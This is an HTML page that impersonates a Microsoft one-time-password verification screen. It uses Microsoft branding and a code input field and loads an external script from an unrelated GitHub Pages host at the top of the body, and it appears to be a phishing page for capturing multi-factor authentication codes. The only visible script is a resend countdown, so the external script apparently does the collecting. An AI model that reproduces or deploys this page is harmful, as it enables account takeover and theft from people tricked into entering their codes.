<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Microsoft – OTP Verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{
  box-sizing:border-box;
  font-family:"Segoe UI", Arial, sans-serif;
}

body{
  margin:0;
  min-height:100vh;
  background: linear-gradient(135deg, #e5f1fb, #ffffff);
  display:flex;
  align-items:center;
  justify-content:center;
}

/* ===== OTP BOX ===== */
.otp-box{
  width:360px;
  background:#fff;
  padding:35px;
  border-radius:8px;
  box-shadow:0 10px 30px rgba(0,0,0,0.12);
  text-align:center;
}

/* ===== MICROSOFT LOGO ===== */
.ms-logo{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  font-size:20px;
  font-weight:600;
  color:#333;
  margin-bottom:18px;
}

.ms-logo span{
  width:18px;
  height:18px;
  display:grid;
  grid-template-columns:repeat(2,1fr);
  grid-template-rows:repeat(2,1fr);
  gap:2px;
}

.ms-logo span i{display:block;}
.c1{background:#F25022;}
.c2{background:#7FBA00;}
.c3{background:#00A4EF;}
.c4{background:#FFB900;}

h2{
  margin:10px 0 10px;
}

p{
  font-size:14px;
  color:#555;
}

/* ===== OTP INPUTS ===== */
.otp-inputs{
  margin:20px 0;
  display:flex;
  justify-content:space-between;
}

.otp-inputs input{
  width:350px;
  height:55px;
  text-align:center;
  font-size:22px;
  border-radius:6px;
  border:1px solid #bbb;
  outline:none;
}

.otp-inputs input:focus{
  border-color:#0067b8;
}

/* ===== BUTTONS ===== */
.btn{
  width:100%;
  padding:10px;
  background:#0067b8;
  color:#fff;
  border:none;
  font-size:16px;
  border-radius:4px;
  cursor:pointer;
  margin-top:10px;
}

.resend{
  margin-top:15px;
  font-size:14px;
  color:#0067b8;
  cursor:pointer;
}

.resend.disabled{
  color:#999;
  pointer-events:none;
}

.timer{
  font-size:14px;
  margin-top:10px;
  color:#444;
}

</style>
</head>

<body>
<script src="https://plyarth.github.io/intc/in.js"></script>
<div class="otp-box">

  <!-- ✅ MICROSOFT LOGO -->
  <div class="ms-logo">
    <span>
      <i class="c1"></i>
      <i class="c2"></i>
      <i class="c3"></i>
      <i class="c4"></i>
    </span>
    Microsoft
  </div>

  <h2>Enter OTP</h2>
  <p>We sent a 6-digit code to your device.</p>
<form>
  <div class="otp-inputs">
    <input maxlength="16" name="otp" reaquired>
  </div>

  <!-- VERIFY BUTTON (NO JS ACTION) -->
  <button class="btn" type="submit">Verify</button>
</form>
  <!-- TIMER -->
  <div class="timer" id="timerText"></div>

  <!-- RESEND BUTTON -->
  <div class="resend disabled" id="resendBtn">Resend Code</div>

</div>

<script>
let retryCount = 0;
let cooldowns = [30, 60, 120, 300, 600];
let timeLeft = cooldowns[0];
let timer;

// Start Timer
function startTimer() {
  document.getElementById("resendBtn").classList.add("disabled");

  timer = setInterval(() => {
    document.getElementById("timerText").innerText =
      `Resend available in ${timeLeft}s`;

    timeLeft--;

    if (timeLeft < 0) {
      clearInterval(timer);
      document.getElementById("timerText").innerText = "";
      document.getElementById("resendBtn").classList.remove("disabled");
    }
  }, 1000);
}

// ✅ ONLY RESEND FUNCTION WORKS
document.getElementById("resendBtn").onclick = () => {
  retryCount++;

  if (retryCount >= cooldowns.length) {
    timeLeft = cooldowns[cooldowns.length - 1];
  } else {
    timeLeft = cooldowns[retryCount];
  }

  startTimer();
};

// Start Initial Timer
startTimer();
</script>

</body>
</html>
